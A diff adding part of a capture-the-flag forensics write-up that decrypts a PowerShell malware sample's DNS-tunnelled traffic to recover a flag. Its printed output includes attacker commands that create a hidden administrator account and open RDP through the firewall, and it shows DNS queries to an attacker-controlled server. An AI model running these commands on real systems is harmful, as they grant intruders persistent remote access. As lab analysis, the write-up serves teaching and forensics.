@@ -119,4 +119,56 @@ Resolve-DnsName -type A -DnsOnly $domain -Server 147.182.172.189
 Resolve-DnsName -type A -DnsOnly end.windowsliveupdater.com -Server 147.182.172.189
 }
 ```
+It appears the AES key used is a1E4MUtycWswTmtrMHdqdg== (kQ81Krqk0Nkk0wjv), which is exactly 16 characters - we're working with a 128 bit AES key, but the script itself seems to ask for a 256 bit key... Also, it appears that the first 16 bytes of each message is likely to be an initialization vector, as this can be gathered from the 'Decrypt-String' function. 
+
+Examining the pcap further, you can find excessive DNS queries with supicious domain names which almost look like encoded data exfiltration. In the beginning, there appears to be a large query containing several TXT records which appear to be answered in base64 encoding.
+
+Modifying the script to decrypt rather than execute, we get the following script and subsequent output.
+
+```powershell
+$key = "a1E4MUtycWswTmtrMHdqdg=="
+$out = "Ifu1yiK5RMABD4wno66axIGZuj1HXezG5gxzpdLO6ws=",
+'hhpgWsOli4AnW9g/7TM4rcYyvDNky4yZvLVJ0olX5oA=', 
+'58v04KhrSziOyRaMLvKM+JrCHpM4WmvBT/wYTRKDw2s=', 'eTtfUgcchm/R27YJDP0iWnXHy02ijScdI4tUqAVPKGf3nsBE28fDUbq0C8CnUnJC57lxUMYFSqHpB5bhoVTYafNZ8+ijnMwAMy4hp0O4FeH0Xo69ahI8ndUfIsiD/Bru',
+'BbvWcWhRToPqTupwX6Kf7A0jrOdYWumqaMRz6uPcnvaDvRKY2+eAl0qT3Iy1kUGWGSEoRu7MjqxYmek78uvzMTaH88cWwlgUJqr1vsr1CsxCwS/KBYJXhulyBcMMYOtcqImMiU3x0RzlsFXTUf1giNF2qZUDthUN7Z8AIwvmz0a+5aUTegq/pPFsK0i7YNZsK7JEmz+wQ7Ds/UU5+SsubWYdtxn+lxw58XqHxyAYAo0=',
+'vJxlcLDI/0sPurvacG0iFbstwyxtk/el9czGxTAjYBmUZEcD63bco9uzSHDoTvP1ZU9ae5VW7Jnv9jsZHLsOs8dvxsIMVMzj1ItGo3dT+QrpsB4M9wW5clUuDeF/C3lwCRmYYFSLN/cUNOH5++YnX66b1iHUJTBCqLxiEfThk5A=',
+'M3/+2RJ/qY4O+nclGPEvJMIJI4U6SF6VL8ANpz9Y6mSHwuUyg4iBrMrtSsfpA2bh'
+for ($num = 0 ; $num -le $out.Length - 2; $num++) {
+    $encryptedString = $out[$num]
+    $backToPlainText = Decrypt-String $key $encryptedString
+    Write-Host $backToPlainText
+}
+```
+
+```cmd
+hostname
+whoami
+ipconfig
+wmic /namespace:\\root\SecurityCenter PATH AntiVirusProduct GET /value
+net user DefaultUsr "JHBhcnQxPSdIVEJ7eTB1X2M0bl8n" /add /Y; net localgroup Administrators /add DefaultUsr; net localgroup "Remote Desktop Users" /add DefaultUsr
+netsh advfirewall firewall add rule name="Terminal Server" dir=in action=allow protocol=TCP localport=3389
+```
+
+Since we're just hunting base64 at this point... the created DefaultUsr string decodes from base64 into "$part1='HTB{y0u_c4n_'", which is the first part of the flag. The remainder can likely be found in the additional DNS queries where data exfiltration appear to be taking place in the hostnames.
+
+Reading the Encrypt-String function, it also appears that the output of it is converting from what is likely to be Base64 into hex, so let's convert this back and put the newly gathered base64 strings into the decryptor function. From there, it is just a matter of putting all the hexes into powershell (manually, eugh) and then converting, then decrypting.
+
+```powershell
+$key = "a1E4MUtycWswTmtrMHdqdg=="
+$hexes = "CC1C9AC2958A2E63609272E2B4F8F43632A806549B03AB7E4EB39771AEDA4A1BC1006AC8A03F9776B08321BD6D5247BB",
+"7679895D1CF7C07BB6A348E1AA4AFC655958A6856F1A34AAD5E97EA55B08767035F2497E5836EA0ECA1F1280F59742A3",
+"09E28DD82C14BC32513652DAC2F2C27B0D73A3288A980D8FCEF94BDDCF9E28222A1CA17BB2D90FCD615885634879041420FC39C684A9E371CC3A06542B6660055840BD94CCE65E23613925B4D9D2BA5318EA75BC653004D45D505ED62567017A6FA4E7593D83092F67A81082D9930E99BA20E34AACC4774F067442C6622F5DA2A9B09FF558A8DF000ECBD37804CE663E3521599BC7591005AB6799C57068CF0DC6884CECF01C0CD44FD6B82DB788B35D62F02E4CAA1D973FBECC235AE9F40254C63D3C93C89930DA2C4F42D9FC123D8BAB00ACAB5198AFCC8C6ACD81B19CD264CC6353668CEA4C88C8AEEA1D58980022DA8FA2E917F17C28608818BF550FEA66973B5A8355258AB0AA281AD88F5B9EB103AC666FE09A1D449736335C09484D271C301C6D5780AB2C9FA333BE3B0185BF071FB1205C4DBEAA2241168B0748902A6CE14903C7C47E7C87311044CB9873A4",
+"ECABC349D27C0B0FFFD1ACEEDBE06BB6C2EB000EE4F9B35D6F001500E85642A2DCC8F1BE2CF4D667F458C1DE46D24B1C2E0F5D94E52649C70402C1B0A2FF7B49FC32DDD67F275307A74B2C4D0864B3F0486186DA9443EB747F717B3911C959DC7E300844D60655410C3988238E615D616F33D27F63CE4D1E065A416911BC50D46F33D27F63CE4D1E065A416911BC50D49886FDDAC2BED6F6DA73637AD2F20CF199B8CE3D9DEE03C0180C7D1198B49C02769E5EE4EAB896D7D3BB478EA140816779472A243BFB0852AF372323EC1329883C81A3F2AEB1D3DAAE8496E1DBF97F435AE40A09203B890C4A174D77CB7026C4E990A6FB6424A7501823AD31D3D6B6344C7971C8D447C078C4471732AD881C394BC8B1A66E0BED43DDC359269B57D1D5D68DCD2A608BF61716BB47D6FE4D5C9D6E8BB2981F214A8234B0DD0210CA96EB2D6322B0F7F3D748C4C9F8B80EFF5A6921A3D1A8621A49F4D29BC9851D25230B"
+$outItems = New-Object System.Collections.Generic.List[System.Object]
+foreach ($hex in $hexes) {
+    $numbers = [System.Convert]::FromHexString($hex)
+    $outItems.Add([System.Convert]::ToBase64String($numbers))
+}
+for ($num = 0 ; $num -lt $outItems.Count; $num++) {
+    $backToPlainText = Decrypt-String $key $outItems[$num]
+    Write-Host $backToPlainText
+}
+```
+
+This finally yields the last part of the key, "$part2=4utom4t3_but_y0u_c4nt_h1de}"
 
